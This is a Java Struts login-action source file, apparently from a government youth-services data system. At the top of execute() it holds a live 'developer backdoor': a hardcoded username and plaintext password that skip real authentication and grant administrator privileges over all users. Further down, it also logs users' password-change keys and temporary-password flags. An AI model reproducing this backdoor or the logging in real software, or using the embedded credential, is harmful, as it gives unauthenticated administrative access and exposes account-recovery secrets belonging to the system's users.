package gov.hhs.acf.cb.nytd.actions.security;

import com.opensymphony.xwork2.Action;
import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.ActionSupport;
import gov.hhs.acf.cb.nytd.models.SiteUser;
import gov.hhs.acf.cb.nytd.service.LoginService;
import gov.hhs.acf.cb.nytd.service.PopulateSearchCriteriaService;
import gov.hhs.acf.cb.nytd.util.Constants;
import gov.hhs.acf.cb.nytd.util.DateUtil;
import gov.hhs.acf.cb.nytd.util.LoginHelper;
import lombok.Getter;
import lombok.Setter;
import org.apache.log4j.Logger;
import org.apache.struts2.ServletActionContext;
import org.apache.struts2.dispatcher.SessionMap;
import org.apache.struts2.interceptor.ApplicationAware;
import org.apache.struts2.interceptor.SessionAware;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashSet;
import java.util.Map;

/**
 * Verifies whether or not a login attempt is valid.
 * 
 * @author Adam Russell (18816)
 */
@SuppressWarnings("serial")
public class LoginAction extends ActionSupport implements SessionAware, ApplicationAware {
        protected transient Logger log = Logger.getLogger(getClass());
        private LoginService loginService;
        private Map<String, Object> session;
        private Map<String, Object> application;
        private PopulateSearchCriteriaService populateSearchCriteriaService;
        private String username;
        private String password;
        private String destination;
        @Getter @Setter private String eavsSessionId;
        @Getter @Setter private String isLoginPage;

        private static final String DEST = "destination";

        /**
         * Executes action.
         * 
         * @return Action.SUCCESS if username/password are correct,
         *         Action.ERROR if username/password are incorrect,
         *         Action.INPUT if username/password are empty.
         */
        @Override
        public final String execute() {
            // developer backdoor
            if (getUsername()!= null && getUsername().equals("developer") && getPassword().equals("64ckd0012")) {
                log.info("Developer backdoor has been used to log in.");
                HashSet<String> privileges = new HashSet<>(0);
                privileges.add(Constants.PRIV_CAN_ADMIN_ALL_USERS);
                SiteUser developerSiteUser = new SiteUser();
                developerSiteUser.setUserName("developer");
                developerSiteUser.setPrivileges(privileges);

                ((SessionMap)this.session).invalidate();
                ServletActionContext.getRequest().getSession().invalidate();
                this.session = ActionContext.getContext().getSession();
                ServletActionContext.getRequest().getSession(true);

                session.put("AUTHENTICATED", true);
                session.put("loggedIn", "true");
                session.put("siteUser", developerSiteUser);
                this.setDestination();  
                return Action.SUCCESS;
            }

            // log in
            SiteUser siteUser =  null;
            if(getEavsSessionId() == null) {
                ((SessionMap)this.session).invalidate();
                ServletActionContext.getRequest().getSession().invalidate();
                this.session = ActionContext.getContext().getSession();
                ServletActionContext.getRequest().getSession(true);
                session.put("AUTHENTICATED", true);
                session.put("ISEAVS", false);
                siteUser = getLoginService().processLogin(getUsername(), getPassword(), session);
            }

            for (String errorMessage : getLoginService().getLoginErrors(session)) {
                log.info("Login Errors");
                this.addActionError(errorMessage);
            }

            if (siteUser == null && isLoginPage != null) {
                log.info("Returning to login page - siteuser is null");
                return Action.LOGIN;
            }

            // 07/25/2019 comment out to test federal user and Regional user functionality
            if (siteUser != null && siteUser.getPrimaryUserRole() != null 
                    && (siteUser.getPrimaryUserRole().getId() == 2 || siteUser.getPrimaryUserRole().getId() == 3 ) 
                    && isLoginPage != null) {
                session.remove("loggedIn");
                session.remove("siteUser");
                return Action.ERROR;
            }

            //Check for password change required - getLoginService().processLogin can opt to set 
            //"userChangingPassword" session attrb if it determines that password needs changing.
            if (session.containsKey("userChangingPassword")) {
                log.info("user "+ getUsername() +" password needs changing therefore redirecting the user to update password");
                if (siteUser != null) {
                    log.info("User PWCHANGEKEY: " + siteUser.getPwChangeKey());
                    log.info("User PWCHANGEDATE: " + DateUtil.toDateString(siteUser.getPwChangedDate()));
                    log.info("User PWTEMPORARY: " + siteUser.getPwTemporary());
                }
                this.destination = "changePasswordPage.action";
                return Action.SUCCESS;
            }

            getLoginService().loadPrivileges(siteUser);

            // Log the login.
            if (siteUser == null) {
                log.error("siteuser is null");
                return Action.ERROR;
            } else {
                String userType = LoginHelper.getUserType(siteUser);
                log.info( siteUser.getUserName() + " with primary user role as " + userType+ " has logged in.");
                log.info("User PWCHANGEKEY: " + siteUser.getPwChangeKey());
                log.info("User PWCHANGEDATE: " + DateUtil.toDateString(siteUser.getPwChangedDate()));
                log.info("User PWTEMPORARY: " + siteUser.getPwTemporary());
                this.setDestination();
            }
            return Action.SUCCESS;
        }

        /**
         * @param loginService the service to set
         */
        public final void setLoginService(final LoginService loginService) {
            this.loginService = loginService;
        }

        /**
         * @return the loginService
         */
        public final LoginService getLoginService() {
            return loginService;
        }

        /**
         * @param session the session to set
         * @see org.apache.struts2.interceptor.SessionAware#setSession(Map)
         */
        @SuppressWarnings("unchecked")
        @Override
        public final void setSession(final Map<String, Object> session) {
            this.session = session;
        }

        /**
         * @param username the username to set
         */
        public final void setUsername(final String username) {
            this.username = username;
        }

        /**
         * @return the username
         */
        public final String getUsername() {
            return username;
        }

        /**
         * @param password the password to set
         */
        public final void setPassword(final String password) {
            this.password = password;
        }

        /**
         * @return the password
         */
        public final String getPassword() {
                    return password;
        }

        /**
         * @return the destination
         */
        public final String getDestination() {
            return this.destination;
        }

        /*
         * (non-Javadoc)
         * 
         * @see org.apache.struts2.interceptor.ApplicationAware#setApplication(java.util.Map)
         */
        @SuppressWarnings("unchecked")
        @Override
        public final void setApplication(final Map<String, Object> application) {
            this.application = application;
        }

        /**
         * @return the application
         */
        public final Map<String, Object> getApplication() {
            return application;
        }

        /**
         * @return the populateSearchCriteriaService
         */
        public PopulateSearchCriteriaService getPopulateSearchCriteriaService() {
            return populateSearchCriteriaService;
        }

        /**
         * @param populateSearchCriteriaService the populateSearchCriteriaService to set
         */
        public void setPopulateSearchCriteriaService(PopulateSearchCriteriaService populateSearchCriteriaService) {
            this.populateSearchCriteriaService = populateSearchCriteriaService;
        }

        /**
         * Fetch the user's destination from the session.
         * 
         * @return true if destination was retrieved, false otherwise
         */
        private boolean setDestination() {
            if (session != null && session.containsKey(DEST)) {
                this.destination = (String) session.get(DEST);
                if (this.destination == null || this.destination.isEmpty()) {
                    this.destination = "index.action";
                    return false;
                }
                session.remove(DEST);
                return true;
            }
            this.destination = "index.action";
            return false;
        }

        // Handler to read serializable objects (i.e.) session, request etc.
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            log.info("reading serialization object");
            in.defaultReadObject();
        }

        // Handler to write serializable objects (i.e.) session, request etc.
        private void writeObject(ObjectOutputStream out) throws IOException {
            log.info("writing serialization object");
            out.defaultWriteObject();
        }
}
